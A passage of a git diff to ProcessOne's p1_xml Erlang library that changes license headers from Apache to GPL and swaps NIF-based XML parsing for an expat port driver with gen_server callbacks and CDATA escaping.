+Config = [{erl_opts, [debug_info, {src_dirs, [src, specs]}|Macros]},
+          {port_env, [{"CFLAGS", "$CFLAGS -g -O2 -Wall" ++ FlashHackFlag},
+                      {"LDFLAGS", "$LDFLAGS -lexpat"}]},
+          {port_specs, [{"priv/lib/expat_erl.so", ["c_src/expat_erl.c"]}
+                        | NIFPortSpec]}],
+%%io:format("xml configuration:~n  ~p~n", [Config]),
+Config.
+
+%% Local Variables:
+%% mode: erlang
+%% End:
+%% vim: set filetype=erlang tabstop=8:
diff --git a/spec/README.md b/spec/README.md
deleted file mode 100644
index 9f91deb..0000000
--- a/spec/README.md
+++ /dev/null
@@ -1,6 +0,0 @@
-This file is used to generate `src/xmlrpc_codec.erl`.
-
-From repository root, you can regenerate the file with:
-
-    erl -noinput +B -pa ebin -pa deps/*/ebin -eval \
-          'case xml_gen:compile("spec/xmlrpc_codec.spec") of ok -> halt(0); _ -> halt(1) end.'
diff --git a/spec/xmlrpc_codec.spec b/spec/xmlrpc_codec.spec
index c57c360..99d3b66 100644
--- a/spec/xmlrpc_codec.spec
+++ b/spec/xmlrpc_codec.spec
@@ -66,16 +66,16 @@
 	   xmlns = <<"xmlrpc">>,
 	   result = {i4, '$cdata'},
 	   cdata = #cdata{required = true,
-			  dec = {erlang, binary_to_integer, []},
-			  enc = {erlang, integer_to_binary, []}}}).
+			  dec = {xml_util, binary_to_integer, []},
+			  enc = {xml_util, integer_to_binary, []}}}).
 
 -xml(int,
      #elem{name = <<"int">>,
 	   xmlns = <<"xmlrpc">>,
 	   result = {int, '$cdata'},
 	   cdata = #cdata{required = true,
-			  dec = {erlang, binary_to_integer, []},
-			  enc = {erlang, integer_to_binary, []}}}).
+			  dec = {xml_util, binary_to_integer, []},
+			  enc = {xml_util, integer_to_binary, []}}}).
 
 -xml(string,
      #elem{name = <<"string">>,
@@ -88,8 +88,8 @@
 	   xmlns = <<"xmlrpc">>,
 	   result = {double, '$cdata'},
 	   cdata = #cdata{required = true,
-			  dec = {erlang, binary_to_float, []},
-			  enc = {erlang, float_to_binary, []}}}).
+			  dec = {xml_util, binary_to_float, []},
+			  enc = {xml_util, float_to_binary, []}}}).
 
 -xml(base64,
      #elem{name = <<"base64">>,
diff --git a/src/p1_xml.app.src b/src/p1_xml.app.src
index 1b1d707..9980a1a 100644
--- a/src/p1_xml.app.src
+++ b/src/p1_xml.app.src
@@ -1,39 +1,18 @@
-%%%----------------------------------------------------------------------
-%%% File    : xml.erl
-%%% Author  : Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%% Purpose : XML utils
-%%% Created : 4 Apr 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%%-------------------------------------------------------------------
+%%% @author Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%% @copyright (C) 2013, Evgeniy Khramtsov
+%%% @doc
 %%%
-%%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
-%%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
-%%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
-%%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
-%%%
-%%%----------------------------------------------------------------------
-
+%%% @end
+%%% Created :  4 Apr 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
+%%%-------------------------------------------------------------------
 {application, p1_xml,
- [{description,  "Fast Expat based Erlang XML parsing library"},
-  {vsn,          "1.1.0"},
+ [{description,  "XML library"},
+  {vsn,          "0.1.0"},
   {modules,      []},
   {registered,   []},
   {applications, [kernel, stdlib]},
-  {mod,          {xml_app,[]}},
-
-  %% hex.pm packaging:
-  {files, ["src/", "c_src/xml.c", "c_src/xml_stream.c", "include/", "spec/", "rebar.config.script", "README.md", "LICENSE.txt"]},
-  {licenses, ["Apache 2.0"]},
-  {contributors, ["ProcessOne"]},
-  {links, [{"Github", "https://github.com/processone/xml"}]}]}.
+  {mod,          {xml_app,[]}}]}.
 
 %% Local Variables:
 %% mode: erlang
diff --git a/src/p1_xmlrpc.erl b/src/p1_xmlrpc.erl
index 59ceccf..906a825 100644
--- a/src/p1_xmlrpc.erl
+++ b/src/p1_xmlrpc.erl
@@ -1,25 +1,29 @@
-%%%-------------------------------------------------------------------
+%%%----------------------------------------------------------------------
 %%% File    : p1_xmlrpc.erl
 %%% Author  : Evgeny Khramtsov <ekhramtsov@process-one.net>
 %%% Purpose : XMLRPC encoder/decoder
 %%% Created : 3 Oct 2014 by Evgeny Khramtsov <ekhramtsov@process-one.net>
 %%%
 %%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+%%% p1_xml, Copyright (C) 2002-2015   ProcessOne
 %%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
 %%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
 %%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
+%%% You should have received a copy of the GNU General Public License
+%%% along with this program; if not, write to the Free Software
+%%% Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+%%% 02111-1307 USA
 %%%
-%%%-------------------------------------------------------------------
+%%%----------------------------------------------------------------------
+
 -module(p1_xmlrpc).
 
 %% API
diff --git a/src/xml.erl b/src/xml.erl
index aedbdea..a6f71ae 100644
--- a/src/xml.erl
+++ b/src/xml.erl
@@ -5,19 +5,22 @@
 %%% Created : 20 Nov 2002 by Alexey Shchepin <alexey@process-one.net>
 %%%
 %%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+%%% p1_xml, Copyright (C) 2002-2015   ProcessOne
 %%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
 %%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
 %%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
+%%% You should have received a copy of the GNU General Public License
+%%% along with this program; if not, write to the Free Software
+%%% Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+%%% 02111-1307 USA
 %%%
 %%%----------------------------------------------------------------------
 
@@ -25,27 +28,74 @@
 
 -author('alexey@process-one.net').
 
+-behaviour(gen_server).
+
 -export([element_to_binary/1, get_so_path/0,
-	 crypt/1, remove_cdata/1,
+	 crypt/1, make_text_node/1, remove_cdata/1,
 	 remove_subtags/3, get_cdata/1, get_tag_cdata/1,
 	 get_attr/2, get_attr_s/2, get_tag_attr/2,
 	 get_tag_attr_s/2, get_subtag/2, get_subtags/2, get_subtag_cdata/2,
          get_subtag_with_xmlns/3, get_subtags_with_xmlns/3,
 	 append_subtags/2, get_path_s/2,
-	 replace_tag_attr/3, replace_subtag/2, to_xmlel/1]).
+	 replace_tag_attr/3, to_xmlel/1]).
 
--export([load_nif/0]).
+%% Internal exports, call-back functions.
+-export([start_link/0, init/1, handle_call/3, handle_cast/2,
+	 handle_info/2, code_change/3, terminate/2]).
 
 -include("xml.hrl").
 
+%% Select at compile time how to escape characters in binary text
+%% nodes.
+%% Can be choosen with ./configure --enable-full-xml
+-ifdef(FULL_XML_SUPPORT).
+
+-define(ESCAPE_BINARY(CData), make_text_node(CData)).
+
+-else.
+
+-define(ESCAPE_BINARY(CData), crypt(CData)).
+
+-endif.
+
+start_link() ->
+    gen_server:start_link({local, ?MODULE}, ?MODULE, [],
+			  []).
+
+%% Can be choosen with ./configure --disable-nif
+-ifdef(DISABLE_NIF).
+init([]) ->
+    {ok, []}.
+-else.
 %% Replace element_to_binary/1 with NIF
-load_nif() ->
+%% Can be choosen with ./configure --disable-nif
+init([]) ->
     SOPath = filename:join(get_so_path(), "xml"),
     case catch erlang:load_nif(SOPath, 0) of
         ok -> ok;
-        Err -> error_logger:warning_msg("unable to load xml NIF: ~p~n", [Err]),
-               {error, unable_to_load_nif}
-    end.
+        Err -> error_logger:warning_msg("unable to load xml NIF: ~p~n", [Err])
+    end,
+    {ok, []}.
+-endif.
+
+%%% --------------------------------------------------------
+%%% The call-back functions.
+%%% --------------------------------------------------------
+
+handle_call(_, _, State) -> {noreply, State}.
+
+handle_cast(_, State) -> {noreply, State}.
+
+handle_info({'EXIT', Port, Reason}, Port) ->
+    {stop, {port_died, Reason}, Port};
+handle_info({'EXIT', _Pid, _Reason}, Port) ->
+    {noreply, Port};
+handle_info(_, State) -> {noreply, State}.
+
+code_change(_OldVsn, State, _Extra) -> {ok, State}.
+
+terminate(_Reason, _State) ->
+    ok.
 
 %%
 -spec(element_to_binary/1 ::
@@ -54,8 +104,46 @@ load_nif() ->
     -> binary()
 ).
 
-element_to_binary(_El) ->
-    erlang:nif_error(nif_not_loaded).
+element_to_binary(El) ->
+    iolist_to_binary(element_to_string(El)).
+
+%%
+-spec(element_to_string/1 ::
+(
+  El :: xmlel() | cdata())
+    -> string()
+).
+
+element_to_string(El) ->
+    case catch element_to_string_nocatch(El) of
+      {'EXIT', Reason} -> erlang:error({badxml, El, Reason});
+      Result -> Result
+    end.
+
+-spec(element_to_string_nocatch/1 ::
+(
+  El :: xmlel() | cdata())
+    -> iolist()
+).
+
+element_to_string_nocatch(El) ->
+    case El of
+      #xmlel{name = Name, attrs = Attrs, children = Els} ->
+	  if Els /= [] ->
+		 [$<, Name, attrs_to_list(Attrs), $>,
+		  [element_to_string_nocatch(E) || E <- Els], $<, $/,
+		  Name, $>];
+	     true -> [$<, Name, attrs_to_list(Attrs), $/, $>]
+	  end;
+      %% We do not crypt CDATA binary, but we enclose it in XML CDATA
+      {xmlcdata, CData} ->
+	  ?ESCAPE_BINARY(CData)
+    end.
+
+attrs_to_list(Attrs) -> [attr_to_list(A) || A <- Attrs].
+
+attr_to_list({Name, Value}) ->
+    [$\s, Name, $=, $', crypt(Value), $'].
 
 crypt(S) ->
     << <<(case C of
@@ -69,6 +157,70 @@ crypt(S) ->
        || <<C>> <= S >>.
 
 %%
+-spec(make_text_node/1 ::
+(
+  CData :: binary())
+    -> binary()
+).
+
+make_text_node(CData) ->
+    case cdata_need_escape(CData) of
+      cdata ->
+	  CDATA1 = <<"<![CDATA[">>,
+	  CDATA2 = <<"]]>">>,
+	  iolist_to_binary([CDATA1, CData, CDATA2]);
+      none -> CData;
+      {cdata, EndTokens} ->
+	  EscapedCData = escape_cdata(CData, EndTokens),
+	  iolist_to_binary(EscapedCData)
+    end.
+
+cdata_need_escape(CData) ->
+    cdata_need_escape(CData, 0, false, []).
+
+cdata_need_escape(<<>>, _, false, _) -> none;
+cdata_need_escape(<<>>, _, true, []) -> cdata;
+cdata_need_escape(<<>>, _, true, CDataEndTokens) ->
+    {cdata, lists:reverse(CDataEndTokens)};
+cdata_need_escape(<<$], $], $>, Rest/binary>>,
+		  CurrentPosition, _XMLEscape, CDataEndTokens) ->
+    NewPosition = CurrentPosition + 3,
+    cdata_need_escape(Rest, NewPosition, true,
+		      [CurrentPosition + 1 | CDataEndTokens]);
+%% Only <, & need to be escaped in XML text node
+%% See reference: http://www.w3.org/TR/xml11/#syntax
+cdata_need_escape(<<$<, Rest/binary>>, CurrentPosition,
+		  _XMLEscape, CDataEndTokens) ->
+    cdata_need_escape(Rest, CurrentPosition + 1, true,
+		      CDataEndTokens);
+cdata_need_escape(<<$&, Rest/binary>>, CurrentPosition,
+		  _XMLEscape, CDataEndTokens) ->
+    cdata_need_escape(Rest, CurrentPosition + 1, true,
+		      CDataEndTokens);
+cdata_need_escape(<<_:8, Rest/binary>>, CurrentPosition,
+		  XMLEscape, CDataEndTokens) ->
+    cdata_need_escape(Rest, CurrentPosition + 1, XMLEscape,
+		      CDataEndTokens).
+
+escape_cdata(CData, EndTokens) ->
+    escape_cdata(CData, 0, EndTokens, []).
+
+escape_cdata(<<>>, _CurrentPosition, [], Acc) ->
+    lists:reverse(Acc);
+escape_cdata(Rest, CurrentPosition, [], Acc) ->
+    CDATA1 = <<"<![CDATA[">>,
+    CDATA2 = <<"]]>">>,
+    escape_cdata(<<>>, CurrentPosition, [],
+		 [CDATA2, Rest, CDATA1 | Acc]);
+escape_cdata(CData, Index, [Pos | Positions], Acc) ->
+    CDATA1 = <<"<![CDATA[">>,
+    CDATA2 = <<"]]>">>,
+    Split = Pos - Index,
+    {Part, Rest} = split_binary(CData, Split + 1),
+    escape_cdata(Rest, Pos + 1, Positions,
+		 [CDATA2, Part, CDATA1 | Acc]).
+
+%%
 -spec(remove_cdata_p/1 ::
 (
   El :: xmlel() | cdata())
@@ -87,9 +239,6 @@ remove_cdata_p(_) -> false.
 
 remove_cdata(L) -> [E || E <- L, remove_cdata_p(E)].
 
-%% This function is intended to remove subtags based on a name and an
-%% attribute, usually an xmlns attribute for a specific XMPP
-%% extension.
 -spec(remove_subtags/3 ::
 (
   Xmlel :: xmlel(),
@@ -380,23 +529,6 @@ replace_tag_attr(Name, Value, Xmlel) ->
         attrs = [{Name, Value} | lists:keydelete(Name, 1, Xmlel#xmlel.attrs)]
     }.
 
-
--spec(replace_subtag/2 ::
-(
-  Tag   :: xmlel(),
-  Xmlel :: xmlel())
-    -> Xmlel :: #xmlel{
-           name     :: binary(),
-           attrs    :: [attr(),...],
-           children :: [xmlel() | cdata()]
-       }
-).
-
-replace_subtag(#xmlel{name = Name} = Tag, Xmlel) ->
-    Xmlel#xmlel{
-        children = [Tag | lists:keydelete(Name, #xmlel.name, Xmlel#xmlel.children)]
-    }.
-
 to_xmlel({_, Name, Attrs, Els}) ->
     #xmlel{name = iolist_to_binary(Name),
            attrs = [{iolist_to_binary(K), iolist_to_binary(V)}
@@ -406,19 +538,6 @@ to_xmlel({xmlcdata, CData}) ->
     {xmlcdata, iolist_to_binary(CData)}.
 
 get_so_path() ->
-    PrivDir = case code:priv_dir(p1_xml) of
-                  {error, _} ->
-                      %% code:priv is looking for a directory with Name and optional version in path
-                      %% Search for p1_xml will fail if we are using xml as directory name:
-                      case code:priv_dir(xml) of
-                          {error, _} ->
-                              EbinDir = filename:dirname(code:which(?MODULE)),
-                              AppDir = filename:dirname(EbinDir),
-                              filename:join([AppDir, "priv"]);
-                          V2 ->
-                              V2
-                      end;
-                  V ->
-                      V
-              end,
-    filename:join([PrivDir, "lib"]).
+    EbinDir = filename:dirname(code:which(?MODULE)),
+    AppDir = filename:dirname(EbinDir),
+    filename:join([AppDir, "priv", "lib"]).
diff --git a/src/xml_app.erl b/src/xml_app.erl
index 48a0d8a..201e2c4 100644
--- a/src/xml_app.erl
+++ b/src/xml_app.erl
@@ -1,23 +1,26 @@
 %%%----------------------------------------------------------------------
 %%% File    : xml_app.erl
 %%% Author  : Evgeniy Khramtsov <ekhramtsov@process-one.net>
-%%% Purpose : XML application
+%%% Purpose : p1_xml application
 %%% Created : 1 May 2013 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
 %%%
 %%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+%%% p1_xml, Copyright (C) 2002-2015   ProcessOne
 %%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
 %%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
 %%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
+%%% You should have received a copy of the GNU General Public License
+%%% along with this program; if not, write to the Free Software
+%%% Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+%%% 02111-1307 USA
 %%%
 %%%----------------------------------------------------------------------
 
@@ -49,13 +52,11 @@
 %% @end
 %%--------------------------------------------------------------------
 start(_StartType, _StartArgs) ->
-    case {xml:load_nif(), xml_stream:load_nif()} of
-        {ok, ok} ->
-            xml_sup:start_link();
-        {{error,_} = E1, _} ->
-            E1;
-        {_, {error,_} = E2} ->
-            E2
+    case xml_sup:start_link() of
+        {ok, Pid} ->
+            {ok, Pid};
+        Error ->
+            Error
     end.
 
 %%--------------------------------------------------------------------
diff --git a/src/xml_gen.erl b/src/xml_gen.erl
index d1f5aca..5293b3f 100644
--- a/src/xml_gen.erl
+++ b/src/xml_gen.erl
@@ -5,19 +5,22 @@
 %%% Created : 22 Jun 2009 by Evgeniy Khramtsov <ekhramtsov@process-one.net>
 %%%
 %%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+%%% p1_xml, Copyright (C) 2002-2015   ProcessOne
 %%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
 %%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
 %%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
+%%% You should have received a copy of the GNU General Public License
+%%% along with this program; if not, write to the Free Software
+%%% Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+%%% 02111-1307 USA
 %%%
 %%%----------------------------------------------------------------------
 
@@ -1726,7 +1729,7 @@ get_fun_return_type(_) ->
 
 term_is_record(Term) ->
     try
-        [H|_T]= tuple_to_list(Term),
+        [H|T]= tuple_to_list(Term),
         true = is_atom(H),
         false == is_label(H)
     catch _:_ ->
diff --git a/src/xml_stream.erl b/src/xml_stream.erl
index 81a47cc..fe50bb9 100644
--- a/src/xml_stream.erl
+++ b/src/xml_stream.erl
@@ -5,19 +5,22 @@
 %%% Created : 17 Nov 2002 by Alexey Shchepin <alexey@process-one.net>
 %%%
 %%%
-%%% Copyright (C) 2002-2015 ProcessOne, SARL. All Rights Reserved.
+%%% p1_xml, Copyright (C) 2002-2015   ProcessOne
 %%%
-%%% Licensed under the Apache License, Version 2.0 (the "License");
-%%% you may not use this file except in compliance with the License.
-%%% You may obtain a copy of the License at
+%%% This program is free software; you can redistribute it and/or
+%%% modify it under the terms of the GNU General Public License as
+%%% published by the Free Software Foundation; either version 2 of the
+%%% License, or (at your option) any later version.
 %%%
-%%%     http://www.apache.org/licenses/LICENSE-2.0
+%%% This program is distributed in the hope that it will be useful,
+%%% but WITHOUT ANY WARRANTY; without even the implied warranty of
+%%% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+%%% General Public License for more details.
 %%%
-%%% Unless required by applicable law or agreed to in writing, software
-%%% distributed under the License is distributed on an "AS IS" BASIS,
-%%% WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-%%% See the License for the specific language governing permissions and
-%%% limitations under the License.
+%%% You should have received a copy of the GNU General Public License
+%%% along with this program; if not, write to the Free Software
+%%% Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
+%%% 02111-1307 USA
 %%%
 %%%----------------------------------------------------------------------
 
@@ -25,10 +28,26 @@
 
 -author('alexey@process-one.net').
 
+-behaviour(gen_server).
+
 -export([new/1, new/2, parse/2, close/1,
 	 change_callback_pid/2, parse_element/1]).
 
--export([load_nif/0]).
+%% Internal exports, call-back functions.
+-export([start_link/0, init/1, handle_call/3, handle_cast/2,
+	 handle_info/2, code_change/3, terminate/2]).
+
+-define(XML_START, 0).
+
+-define(XML_END, 1).
+
+-define(XML_CDATA, 2).
+
+-define(XML_ERROR, 3).
+
+-define(PARSE_COMMAND, 0).
+
+-define(PARSE_FINAL_COMMAND, 1).
 
 -include("xml.hrl").
 
@@ -48,48 +67,234 @@
 
 -type xml_stream_state() :: #xml_stream_state{}.
 -type stack() :: [xmlel()].
+-type event() :: {?XML_START, {binary(), [attr()]}} |
+                 {?XML_END, binary()} |
+                 {?XML_CDATA, binary()} |
+                 {?XML_ERROR, binary()}.
 
 -export_type([xml_stream_state/0, xml_stream_el/0]).
 
-load_nif() ->
-    NifFile = filename:join([xml:get_so_path(), atom_to_list(xml_stream)]),
-    case erlang:load_nif(NifFile, 0) of
-	ok ->
-	    ok;
-        {error, {Reason, Txt}} ->
-            error_logger:error_msg("failed to load NIF ~s: ~s",
-                                   [NifFile, Txt]),
-            {error, Reason}
+start_link() ->
+    gen_server:start_link({local, ?MODULE}, ?MODULE, [],
+			  []).
+
+init([]) ->
+    case load_driver() of
+        ok ->
+            {ok, []};
+        {error, Why} ->
+            {stop, Why}
+    end.
+
+%%% --------------------------------------------------------
+%%% The call-back functions.
+%%% --------------------------------------------------------
+
+handle_call(_, _, State) -> {noreply, State}.
+
+handle_cast(_, State) -> {noreply, State}.
+
+handle_info({'EXIT', Port, Reason}, Port) ->
+    {stop, {port_died, Reason}, Port};
+handle_info({'EXIT', _Pid, _Reason}, Port) ->
+    {noreply, Port};
+handle_info(_, State) -> {noreply, State}.
+
+code_change(_OldVsn, State, _Extra) -> {ok, State}.
+
+terminate(_Reason, _State) ->
+    ok.
+
+process_data(CallbackPid, Stack, Data) ->
+    case Data of
+      {?XML_START, {Name, Attrs}} ->
+	  if
+		Stack == [] ->
+		    catch gen_fsm:send_event(CallbackPid,
+					  {xmlstreamstart, Name, Attrs}),
+		    %% There is no need to store name or attributes of
+		    %% stream opening element as it is not used
+		    %% anymore.
+		    [xmlstreamstart];
+		true ->
+		    [#xmlel{name = Name, attrs = Attrs, children = []}
+			| Stack]
+	  end;
+      {?XML_END, EndName} ->
+	  case Stack of
+	    [xmlstreamstart] ->
+		    catch gen_fsm:send_event(CallbackPid,
+					     {xmlstreamend, EndName}),
+		    [];
+	    [#xmlel{name = Name, attrs = Attrs, children = Els},
+	     xmlstreamstart] ->
+		NewEl = #xmlel{name = Name, attrs = Attrs,
+			       children = lists:reverse(Els)},
+		catch gen_fsm:send_event(CallbackPid,
+			    {xmlstreamelement, NewEl}),
+		[xmlstreamstart];
+	    [#xmlel{name = Name, attrs = Attrs, children = Els},
+	     #xmlel{name = Name1, attrs = Attrs1, children = Els1}
+	     | Tail] ->
+		NewEl = #xmlel{name = Name, attrs = Attrs,
+			       children = lists:reverse(Els)},
+		[{xmlel, Name1, Attrs1, [NewEl | Els1]} | Tail]
+	  end;
+      {?XML_CDATA, CData} ->
+	  case Stack of
+	    [xmlstreamstart] ->
+		catch gen_fsm:send_all_state_event(CallbackPid,
+						   {xmlstreamcdata, CData}),
+		[xmlstreamstart];
+	    %% Merge CDATA nodes if they are contiguous
+	    %% This does not change the semantic: the split in
+	    %% several CDATA nodes depends on the TCP/IP packet
+	    %% fragmentation
+	    [#xmlel{name = Name, attrs = Attrs,
+		    children = [{xmlcdata, PreviousCData} | Els]}
+	     | Tail] ->
+		[#xmlel{name = Name, attrs = Attrs,
+			children =
+			    [{xmlcdata,
+			      iolist_to_binary([PreviousCData, CData])}
+			     | Els]}
+		 | Tail];
+	    %% No previous CDATA
+	    [#xmlel{name = Name, attrs = Attrs, children = Els}
+	     | Tail] ->
+		[#xmlel{name = Name, attrs = Attrs,
+			children = [{xmlcdata, CData} | Els]}
+		 | Tail];
+	    [] -> []
+	  end;
+      {?XML_ERROR, Err} ->
+	  catch gen_fsm:send_event(CallbackPid,
+				   {xmlstreamerror, Err})
     end.
 
 -spec new(pid()) -> xml_stream_state().
 
-new(CallbackPid) ->
-    new(CallbackPid, infinity).
+new(CallbackPid) -> new(CallbackPid, infinity).
 
 -spec new(pid(), non_neg_integer() | infinity) -> xml_stream_state().
 
-new(_CallbackPid, _MaxSize) ->
-    erlang:nif_error(nif_not_loaded).
+new(CallbackPid, MaxSize) ->
+    Port = open_port({spawn, "expat_erl"}, [binary]),
+    #xml_stream_state{callback_pid = CallbackPid,
+		      port = Port, stack = [], size = 0, maxsize = MaxSize}.
 
 -spec change_callback_pid(xml_stream_state(), pid()) -> xml_stream_state().
 
-change_callback_pid(_State, _CallbackPid) ->
-    erlang:nif_error(nif_not_loaded).
+change_callback_pid(State, CallbackPid) ->
+    State#xml_stream_state{callback_pid = CallbackPid}.
 
 -spec parse(xml_stream_state(), iodata()) -> xml_stream_state().
 
-parse(_State, _Data) ->
-    erlang:nif_error(nif_not_loaded).
+parse(#xml_stream_state{callback_pid = CallbackPid,
+			port = Port, stack = Stack, size = Size,
+			maxsize = MaxSize} =
+	  State,
+      Str) ->
+    StrSize = byte_size(Str),
+    Res = port_control(Port, ?PARSE_COMMAND, Str),
+    {NewStack, NewSize} = lists:foldl(fun (Data,
+					   {St, Sz}) ->
+					      NewSt = process_data(CallbackPid,
+								   St, Data),
+					      case NewSt of
+						[_] -> {NewSt, 0};
+						_ -> {NewSt, Sz}
+					      end
+				      end,
+				      {Stack, Size + StrSize},
+				      binary_to_term(Res)),
+    if NewSize > MaxSize ->
+	   catch gen_fsm:send_event(CallbackPid,
+				    {xmlstreamerror,
+				     <<"XML stanza is too big">>});
+       true -> ok
+    end,
+    State#xml_stream_state{stack = NewStack,
+			   size = NewSize}.
 
 -spec close(xml_stream_state()) -> true.
 
-close(_State) ->
-    erlang:nif_error(nif_not_loaded).
+close(#xml_stream_state{port = Port}) ->
+    port_close(Port).
 
 -spec parse_element(iodata()) -> xmlel() |
                                  {error, parse_error} |
                                  {error, binary()}.
 
-parse_element(_Str) ->
-    erlang:nif_error(nif_not_loaded).
+parse_element(Str) ->
+    Port = open_port({spawn, "expat_erl"}, [binary]),
+    Res = port_control(Port, ?PARSE_FINAL_COMMAND, Str),
+    port_close(Port),
+    process_element_events(binary_to_term(Res)).
+
+process_element_events(Events) ->
+    process_element_events(Events, []).
+
+-spec process_element_events([event()], stack()) -> xmlel() |
+                                                    {error, parse_error} |
+                                                    {error, binary()}.
+
+process_element_events([], _Stack) ->
+    {error, parse_error};
+process_element_events([Event | Events], Stack) ->
+    case Event of
+      {?XML_START, {Name, Attrs}} ->
+	  process_element_events(Events,
+				 [#xmlel{name = Name, attrs = Attrs,
+					 children = []}
+				  | Stack]);
+      {?XML_END, _EndName} ->
+	  case Stack of
+	    [#xmlel{name = Name, attrs = Attrs, children = Els}
+	     | Tail] ->
+		NewEl = #xmlel{name = Name, attrs = Attrs,
+			       children = lists:reverse(Els)},
+		case Tail of
+		  [] ->
+		      if Events == [] -> NewEl;
+			 true -> {error, parse_error}
+		      end;
+		  [#xmlel{name = Name1, attrs = Attrs1, children = Els1}
+		   | Tail1] ->
+		      process_element_events(Events,
+					     [#xmlel{name = Name1,
+						     attrs = Attrs1,
+						     children = [NewEl | Els1]}
+					      | Tail1])
+		end
+	  end;
+      {?XML_CDATA, CData} ->
+	  case Stack of
+	    [#xmlel{name = Name, attrs = Attrs, children = Els}
+	     | Tail] ->
+		process_element_events(Events,
+				       [#xmlel{name = Name, attrs = Attrs,
+					       children =
+						   [{xmlcdata, CData} | Els]}
+					| Tail]);
+	    [] -> process_element_events(Events, [])
+	  end;
+      {?XML_ERROR, Err} -> {error, Err}
+    end.
+
+get_so_path() ->
+    EbinDir = filename:dirname(code:which(?MODULE)),
+    AppDir = filename:dirname(EbinDir),
+    filename:join([AppDir, "priv", "lib"]).
+
+load_driver() ->
+    case erl_ddll:load_driver(get_so_path(), expat_erl) of
+        ok ->
+            ok;
+        {error, already_loaded} ->
+            ok;
+        {error, ErrorDesc} = Err ->
+            error_logger:error_msg("failed to load Expat driver: ~s~n",
+                                   [erl_ddll:format_error(ErrorDesc)]),
+            Err
+    end.
diff --git a/src/xml_sup.erl b/src/xml_sup.erl
index ddcccdd..b74f0dc 100644
--- a/src/xml_sup.erl
+++ b/src/xml_sup.erl
@@ -1,23 +1,26 @@
 %%%----------------------------------------------------------------------
 %%% File    : xml_sup.erl
